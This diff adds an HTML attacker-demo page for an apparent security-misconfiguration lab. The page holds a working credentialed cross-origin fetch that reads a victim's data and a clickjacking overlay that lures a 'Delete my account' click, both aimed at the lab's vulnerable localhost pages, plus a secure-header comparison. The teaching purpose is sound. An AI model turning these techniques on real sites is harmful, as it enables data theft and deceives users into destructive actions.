@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><title>Attacker demo (Lab 6)</title></head>
+<body style="font-family:system-ui;background:#111;color:#eee;padding:2rem">
+<h1>Attacker page — host on another origin</h1>
+
+<h2>1. CORS data theft (victim must be logged in)</h2>
+<button onclick="steal()">Fetch victim data</button>
+<pre id="out">…</pre>
+<script>
+// VULNERABLE data.php reflects our Origin + allows credentials,
+// so the victim's JSON is readable cross-origin.
+async function steal() {
+    const r = await fetch(
+        'http://localhost/A022025-Security-Misconfiguration/lab6-headers/vulnerable/data.php',
+        { credentials: 'include' });
+    document.getElementById('out').textContent = await r.text();
+}
+</script>
+
+<h2>2. Clickjacking (account.php has no frame protection)</h2>
+<p>The red button below is the real account page, framed + overlaid:</p>
+<div style="position:relative;width:440px;height:320px;overflow:hidden;border:2px dashed red">
+    <iframe src="http://localhost/A022025-Security-Misconfiguration/lab6-headers/vulnerable/account.php"
+            style="width:440px;height:320px;opacity:0.4;border:0"></iframe>
+    <div style="position:absolute;top:8px;left:8px;background:#3b82f6;padding:.75rem 1.5rem;border-radius:8px;font-weight:600">
+        Click to claim prize
+    </div>
+</div>
+<p>Victim clicks "prize" → actually hits <b>Delete my account</b>.</p>
+
+<h2>3. Secure page refuses framing (compare)</h2>
+<p>The fixed <code>account_secure.php</code> sends <code>X-Frame-Options: DENY</code> + <code>frame-ancestors 'none'</code> and hides itself via JS if framed anyway. The frame below stays empty / errors:</p>
+<div style="position:relative;width:440px;height:200px;overflow:hidden;border:2px dashed green">
+    <iframe src="http://localhost/A022025-Security-Misconfiguration/lab6-headers/fixed/account_secure.php"
+            style="width:440px;height:200px;border:0"></iframe>
+</div>
+</body>
+</html>
